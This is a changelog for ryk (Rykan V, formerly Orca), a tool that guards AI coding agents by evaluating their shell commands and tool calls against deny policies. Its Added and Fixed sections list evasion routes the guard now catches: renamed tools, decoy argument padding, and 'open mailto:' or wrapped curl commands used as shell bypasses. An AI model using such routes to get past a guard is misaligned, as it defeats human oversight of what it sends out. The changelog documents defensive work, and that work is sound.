* feat(brand): Phase 5a product identity cut Orca → ryk by @christopherkarani in https://github.com/christopherkarani/ryk/pull/75
* feat(cli): P0 permanent allowlist, allow-once, and packs CLI by @christopherkarani in https://github.com/christopherkarani/ryk/pull/77
* feat(cli): DCG-parity ryk explain + remove demo by @christopherkarani in https://github.com/christopherkarani/ryk/pull/76


**Full Changelog**: https://github.com/christopherkarani/ryk/compare/v1.2.8...v1.2.9

## Unreleased

### Breaking
- **Brand hard cut — Rykan V / `ryk` only (no legacy-brand compatibility).**
  - **Product:** full name **Rykan V**; CLI **`ryk`** only (no retired binary aliases).
  - **Environment:** `RYK_*` only (no legacy-brand dual-read/write).
  - **Paths:** workspace `.ryk/`, config `~/.config/ryk/`, resources `share/ryk/`.
  - **Zig modules:** `ryk`, `ryk_core`, `ryk_cli`.
  - **npm scope:** `@rykan/ryk`, `@rykan/pi-ryk`.
  - **Audit actor kind:** `"ryk"`.
  - **Dirs:** `ryk-pi/`, `ryk-dashboard-ui/`.
  - Historical changelog and denylist tokens remain only where they document past brands or attack surface.
  - **Codex guard emit:** `[[RYKAN-V-GUARD]]` only.
  - **Share install path:** `~/.local/share/ryk`.
  - **Git remote / Zig package graph:** unchanged (`build.zig.zon` `.name = .ryk` stays).

### Changed
- **Full Zig shell evaluator (MVP)** — `ryk hook` / `ryk run` / shims evaluate shell commands in-process via `src/shell_engine` by default (`RYK_SHELL_EVAL=zig`). Daemon-down no longer gates shell PreToolUse. `ryk test` / `ryk explain` are Zig-native. Former Rust ExecuteCli surfaces (`scan`, `simulate`, `packs`, `history`, allowlist mutators, …) stub until ported. The Rust daemon crate is removed from the tree.
- **Product language cut (Safe Launch)** — public day-1 path is now:
  - `ryk start` → `ryk <agent>` → `ryk status` → `ryk replay` (+ `ryk stop` off-ramp)
  - Default help shows only public verbs; full surface via `ryk help --all`
  - Public onboarding peers **`ryk quickstart`** and **`ryk setup`** are hard-removed (use `ryk start`; logic retained as library for internal composition)
  - `ryk start` auto-selects **Ask on risk** (no public `--protection` grade menu)
  - Human `ryk status` is traffic light **Protected | Limited | Off** plus one mediation caveat
  - Bare `ryk replay` loads the last session; denials visually dominant; empty state teaches Safe Launch
  - Interactive deny offers **Once / Always / Never** (prompt-native; CLI allow/allow-once remain advanced fallback)
  - Host aliases (`ryk claude`, `ryk codex`, …) are the taught launch path; `ryk run` is the engine / advanced escape hatch
  - Docs/README/quickstart/CLI reference rewritten for the cut; stop next-step points to `orca start`

### Added
- **Phase D residual classifier** — optional `effects.classifier: local` (alias `local-embed`) runs pure-Zig prototype/token similarity on tools that catalog/structural/packs leave under-classified. Default **off**. Raise-only; matchers `classifier.local.*`; fail-closed in strict/ci/redteam when enabled but unavailable. No cloud classification; no new deps.
- **Effect-class policy** (`effects:`) classifies host/MCP tool names into semantic effects (`comms.message`, `comms.publish`, `money.transfer`, …) so users can deny messaging/social tools without listing every name.
- Built-in tool-name catalog and `ryk policy explain tool <name>`.
- Preset `no-external-comms` for strict-local plus external-comms effect denials.
- Host `PreToolUse` generic tools, `ryk decide tool`, and MCP `tools/call` enforce effect rules when `effects:` is configured (deny beats MCP allow).
- `effects.default` applies to unclassified tool names (catalog misses), matching surface-default semantics.
- **Phase B structural classification** — tools renamed as `notify`/`helper` still match effects from argument key sets (e.g. `{to, body}`) and bounded value shapes; reasons use `structural.*` matcher ids (no secret values).
- **Network effect tags** — when `effects:` is active, curated hosts (e.g. `api.twitter.com` → `comms.publish`) merge into network evaluation (`network_tag.*` matchers).
- **Shell bypass (Zig command path)** — `open mailto:…` (and optional curl-to-tagged-host) merges effects on Zig command evaluation (`shell_bypass.*`); host shell PreToolUse uses Zig `shell_engine` MVP packs (documented residual gap vs full effect-class parity).
- `ryk policy explain tool <name> --args '<json-object>'` for structural demos (size-bounded).
- **Phase C discovery** — `ryk mcp inspect` prints inferred effects per tool; `ryk tools classify <name> [--args] [--policy]` for interactive classification (no secret values in output).
- **User effect packs** — YAML in `.ryk/effect-packs/` and `~/.config/ryk/effect-packs/` add names/tokens/structural key-sets (`pack.<id>.*` matchers). Classification-only; decisions still require policy `effects:`. Invalid packs fail closed. Example: `examples/effect-packs/demo.yaml`.

### Fixed
- Network effect tags now apply on the **runtime proxy** path (`network_eval.evaluate` / `ryk run`), not only `policy explain network`.
- Shell bypass: `open -a`/`-b` option values are skipped; multi-URL `curl` scans every operand; `open`/`curl` require command position (avoids `printf … open mailto:` false positives).
- Shell bypass: wrappers with options (`sudo -u root curl …`, `env -i open …`, `xargs curl …`), escaped operators (`foo\;`), non-transfer curl values (`--referer`), and lookup-only `command -v`/`-V` are handled correctly.
- Structural arg scan prefers interesting keys/values against decoy padding (including large objects and string-value slot exhaustion); `href`/`uri` share interesting priority with other URL keys; eviction allocates before free (OOM-safe).
- Shell bypass residual note updated: host shell PreToolUse uses Zig `shell_engine` (MVP); full effect-class parity on compound shell forms remains deferred.

## v1.2.8 - 2026-07-04

### Changed
- Version bump to 1.2.8 across all manifests and plugins.

## v1.2.7 - 2026-07-03

### Added
- Dashboard activity feeds now surface Pi session identifiers for clearer multi-session diagnostics.

### Fixed
- Local release publishing now attaches the complete verified artifact contract, including installer checksums.

## v1.2.6 - 2026-07-01

### Changed
- All plugins and core unified to version **1.2.6**.

### Fixed
- Minor stability improvements across CLI, daemon, and plugin integrations.

## v1.2.5 - 2026-07-01

### Changed
- Pi block and ask states now use compact, branded Orca decision cards with clearer reason hierarchy and bounded long-text wrapping.
- Rust hook output and OpenCode/OpenClaw fallback copy now identify Orca explicitly across block and ask states.

### Fixed
- Pi decision cards use the stable above-editor widget surface and remain aligned for long or unbroken reasons.

## v1.2.4 - 2026-06-30

### Added
- **`--live` / `--tui` alt-screen views** for `history` and `replay`.
- **Reduced-motion support** across TUI spinners and animations.
- **OSC 11 background detection** for automatic light/dark theme wiring.
- **Branded first-run celebration** and improved onboarding moments.
- **Pi slash commands** `/orca-start` and `/orca-stop` for session-level protection control.

### Changed
- **`--no-rich`** and `RYK_NO_RICH=1` now gate color without changing machine-readable output.
- `--tui` + `--json` is rejected at preflight to prevent mixed output modes.

### Fixed
- CLI self-import support in the build.
- Replay/history live help and banner rejection edge cases.
- Phase 6 public contract freeze: exact bytes preserved for JSON, robot, export, and MCP proxy paths.

## v1.2.3 - 2026-06-24

### Fixed
- **OpenCode plugin** — Update for OpenCode 1.16 plugin API so `tool.execute.before` blocking works again.

## v1.2.0 - 2026-06-19

### Added
- **Rust daemon (`orca-daemon`)** — UDS IPC between Zig CLI and Rust evaluator; shell hook evaluation routed through daemon with fail-closed behavior when unavailable.
- **`orca evaluate`** — Stable machine JSON API for shell command evaluation (`--json --stdin`).
- **`orca start`** — Guided onboarding flow with host detection and plugin install.
- **Pi extension (`@orca-guard/pi-orca`)** — Official Pi package for bash tool-call protection via `orca evaluate`.
- **Bundled `orca-daemon`** in all platform release archives and install layouts.

### Changed
- **Zig 0.16.0** toolchain migration.
- **Guided onboarding** — Interactive `orca setup` with multi-host selection.
- **Unified versioning** — Core and all agent plugins aligned to 1.2.0.
- Shell `PreToolUse` / tool evaluation defaults route through Rust daemon when available.

### Fixed
- **Hermes Agent** — Orca discovery, degraded-mode handling, and version mismatch fixes.
- **Pi integration** — Honor deny decisions, timeouts, cwd, and auto unavailable mode.
- Install/DX hardening — quick-install presets, `orca doctor` activation exports, piped install robustness.

## v1.1.5 - 2026-05-24

### Added
- **`orca disable`** — Remove Orca plugin registrations from host agents without touching binary or policy.
- **`orca uninstall`** — Full removal of plugins, binary, and user config (preserves workspace `.ryk/`).

## v1.1.4 - 2026-05-21

### Fixed
- **OpenClaw plugin:** Detect and warn when `api.on` is a no-op for npm installs, preventing silent hook bypass.
- **Core stability:** Fix invalid free in redteam fixture root handling; prevent waitpid panic after watchdog kill in credentials broker.
- **CLI:** Add `--ci` shorthand for `orca run --ci`; auto-resolve fixture root via `resource_root` in `orca redteam`.

### Changed
- **Unified versioning:** All components — core, OpenClaw, OpenCode, Hermes, Codex, and Claude Code plugins — now share version 1.1.4.

## v1.1.0 - 2026-05-12

- Prepared Orca production release metadata and artifact contract.
- Added checksum, release-manifest, SBOM inventory hook, optional signing hook status, install guidance, GitHub release draft, tagging instructions, release checklist, and production-readiness report.

## Previous Phases

Earlier releases established the current policy engine, shell evaluator, host integrations, audit and replay tooling, red-team checks, and release process.
